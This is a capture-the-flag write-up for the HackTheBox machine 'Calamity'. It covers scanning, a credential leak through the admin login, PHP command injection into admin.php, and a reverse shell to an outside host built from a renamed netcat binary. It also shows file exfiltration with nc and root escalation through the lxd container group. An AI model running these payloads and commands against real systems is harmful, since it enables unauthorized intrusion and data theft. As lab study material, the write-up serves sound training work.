```bash
$ sudo nmap -sV -sC 10.10.10.27
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
|   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
|_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Brotherhood Software
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<br/>

Only port 22 and 80, so let's enumerate port 80 that is HTTP

<br/>

Now let's use gobuster for search directories

```bash
$ sudo gobuster -w /opt/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.27 -x php,txt -t 50
/uploads (Status: 301)
/admin.php (Status: 200)
```

<br/>

In uploads, there is nothing, but in admin.php there's a login

![calamity1](/images/htb-calamity/calamity1.png)

Now i'll send the request to burp repeater for test sql injections

![calamity2](/images/htb-calamity/calamity2.png)

So the password is in the response, the credentials are admin:skoupidotenekes

<br/>

Login successfully, there's a html interpreter where i can put my html, I put there php

![calamity3](/images/htb-calamity/calamity3.png)

So now i try to execute commands

![calamity4](/images/htb-calamity/calamity4.png)

Now i'll try to get a reverse shell, but the common techniques doesn't work, so I started to enumerate files, I'll use burp cause it's easier to read

```
GET /admin.php?html=<%3fphp+system("ls+/home/xalvas")%3b+%3f> HTTP/1.1
```

```
alarmclocks
app
dontforget.txt
intrusions
peda
recov.wav
user.txt
```

Let's see what's intrusions

```
GET /admin.php?html=<%3fphp+system("cat+/home/xalvas/intrusions")%3b+%3f>
```

```
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2017-06-28 04:55:42.796288
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2017-06-28 05:22:11.228988
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2017-06-28 05:23:23.424719
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc         ...PROCESS KILLED AT 2017-06-29 02:43:57.083849
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python     ...PROCESS KILLED AT 2017-06-29 02:48:47.909739
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS sh         ...PROCESS KILLED AT 2017-06-29 06:25:04.202315
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS sh         ...PROCESS KILLED AT 2017-06-29 06:25:04.780685
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python     ...PROCESS KILLED AT 2017-06-29 06:25:06.209358
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc        ...PROCESS KILLED AT 2017-06-29 12:15:32.329358
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc        ...PROCESS KILLED AT 2017-06-29 12:15:32.330115
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc        ...PROCESS KILLED AT 2017-06-29 12:16:10.508710
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc        ...PROCESS KILLED AT 2017-06-29 12:16:10.510537
POSSIBLE INTRUSION BY BLACKLISTED PROCCESS python3    ...PROCESS KILLED AT 2017-12-24 10:30:28.836132
```

So the machine is killing nc, sh and python, that are the ones that I tryied to get a reverse shell, now I'm going to copy nc to another directory and rename it to get a reverse shell

```
GET /admin.php?html=<%3fphp+system("cp+/bin/nc+/dev/shm/c3t")%3b+%3f>
```


I give permissions

```
GET /admin.php?html=<%3fphp+system("chmod+777+/dev/shm/c3t")%3b+%3f>
```

And now get the reverse shell

```
GET /admin.php?html=<%3fphp+system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|/dev/shm/c3t+10.10.14.3+9001+>/tmp/f")%3b+%3f>
```

And here's the connection back

```bash
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.27 57116
/bin/sh: 0: can't access tty; job control turned off
$
```

<br/>

Now i'll get a full interactive shell for autocompletition

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@calamity:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 9001
c3t@ubuntu:~/ctf/htb/boxes/calamity$ stty raw -echo
www-data@calamity:/var/www/html$ export term=xterm
```

<br/>

Now let's start by enumerating the xalvas directory

<br/>

There's recov.wav

```
-rw-r--r-- 1 xalvas xalvas 3196724 Jun 27  2017 recov.wav
```

And in /home/xalvas/alarmclocks are more

```
-rw-r--r-- 1 root   root   3196668 Jun 27  2017 rick.wav                        │
-rw-r--r-- 1 root   root   2645839 Jun 27  2017 xouzouris.mp3
```

So i transfered this files to my machine because probably there's a stego technique used here

```
$ /dev/shm/c3t 10.10.14.3 9003 < recov.wav
$ nc -lvnp 9003 > recov.wav
```

```
$ /dev/shm/c3t 10.10.14.3 9003 < rick.wav
$ nc -lvnp 9003 > rick.wav
```

```
$ /dev/shm/c3t 10.10.14.3 9003 < xouzouris.mp3
$ nc -lvnp 9003 > xouzouris.mp3
```

Now i open it on audacity, import the recov.wav and rick.wav, then select effect-invert and there's a voice that will say things

![calamity5](/images/htb-calamity/calamity5.png)

The voice says some numbers and then the password is 185, so the password is 18547936..*

<br/>

Now i'll ssh into xalvas user

```bash
$ ssh xalvas@10.10.10.27
```

<br/>

And now the privesc

```bash
$ id
uid=1000(c3t) gid=1000(c3t) groups=1000(c3t),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare)
```

lxd is for containers, and there's a vulnerability that we can use it to run as root

<br/>

I'll download alpine builder

```bash
$ git clone https://github.com/saghul/lxd-alpine-builder
```

```bash
$ sudo ./build-alpine -a i686
```

And now transfer it

```bash
$ scp alpine-v3.12-i686-20200911_0436.tar.gz xalvas@10.10.10.27:
```

Now let's do the process to get root user

```
$ mkdir privesc
$ cd privesc/
$ mv ../alpine-v3.12-i686-20200911_0436.tar.gz .
$ lxc image import alpine-v3.12-i686-20200911_0436.tar.gz --alias alpine
$ lxc image list
+--------+--------------+--------+-------------------------------+------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCH |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+-------------------------------+------+--------+-------------------------------+
| alpine | c4d146e61042 | no     | alpine v3.12 (20200911_04:36) | i686 | 3.06MB | Sep 11, 2020 at 11:46am (UTC) |
+--------+--------------+--------+-------------------------------+------+--------+-------------------------------+
$ lxc init alpine c3t -c security.privileged=true
$ lxc config device add c3t host-root disk source=/ path=/mnt/root/
$ lxc start c3t
$ lxc exec c3t /bin/sh
~ # cd /mnt/root/root
```
